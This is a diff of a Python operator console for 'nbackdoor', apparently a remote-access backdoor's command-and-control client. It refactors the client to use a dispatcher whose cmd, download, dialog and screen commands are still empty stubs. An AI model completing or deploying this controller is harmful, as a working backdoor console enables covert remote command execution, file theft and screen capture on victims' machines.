@@ -15,17 +15,15 @@ from Crypto.Cipher import AES
 __author__ = 'nekocode'
 
 
-class ControllerClient(threading.Thread):
+class ControllerClient:
     def __init__(self):
-        threading.Thread.__init__(self)
         self.SERVER_HOST = 'http://127.0.0.1:8888'
         self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
         self.IV = '\0' * AES.block_size
         self.SECRET = os.urandom(32)
         self.ws = None
 
-        self.daemon = True
-        self.start()
+        self.exit = False
 
     def run(self):
         while True:
@@ -40,34 +38,13 @@ class ControllerClient(threading.Thread):
                 # time.sleep(1)
 
                 while True:
-                    command = raw_input('nbackdoor:')
-                    args_str = command.split(' ')[1:]
+                    input_str = raw_input('nbackdoor:')
+                    msg = self.command_to_msg(input_str)
 
-                    parser = argparse.ArgumentParser(description="nbackdoor by nekocode!!!",
-                                                    version='1.0.0',
-                                                    formatter_class=argparse.RawTextHelpFormatter,
-                                                    epilog='neko!')
-                    parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
-                    parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')
-
-                    if len(args_str) == 0:
-                        parser.print_help()
-                        continue
-
-                    args = parser.parse_args(args_str)
-
-                    if args.id:
-                        print 'run id'
-                        pass
-
-                    elif args.jobid:
-                        print 'run jobid'
-                        pass
-
-                    msg = json.loads(self.ws.recv())
-                    if 'data' in msg:
-                        data = self.decrypt(msg['data'])
-                        print data
+                    # msg = json.loads(self.ws.recv())
+                    # if 'data' in msg:
+                    #     data = self.decrypt(msg['data'])
+                    #     print data
 
                 # self.ws.close()
 
@@ -75,6 +52,33 @@ class ControllerClient(threading.Thread):
                 if self.ws:
                     self.ws.close()
                 time.sleep(3)
+
+    def command_to_msg(self, input_str):
+        input_array = input_str.split()
+        command_str = input_array[0]
+        args_str = input_array[1:]
+
+        if command_str == 'help':
+            parser = argparse.ArgumentParser(description="nbackdoor by nekocode!!!",
+                                             version='1.0.0',
+                                             formatter_class=argparse.RawTextHelpFormatter,
+                                             epilog='neko!')
+            parser.print_help()
+        elif command_str == 'list':
+            pass
+        elif command_str == 'cmd':
+            pass
+        elif command_str == 'download':
+            pass
+        elif command_str == 'dialog':
+            pass
+        elif command_str == 'screen':
+            pass
+        elif command_str == 'exit':
+            self.exit = True
+            exit()
+
+        return json.dumps({'data': self.encrypt('data')})
 
     def send_msg(self, data):
         msg = {'data': self.encrypt(data)}
@@ -92,8 +96,8 @@ class ControllerClient(threading.Thread):
 
 
 if __name__ == '__main__':
-    ControllerClient()
-    while True:
-        time.sleep(10)
+    client = ControllerClient()
+    while not client.exit:
+        client.run()
 
 
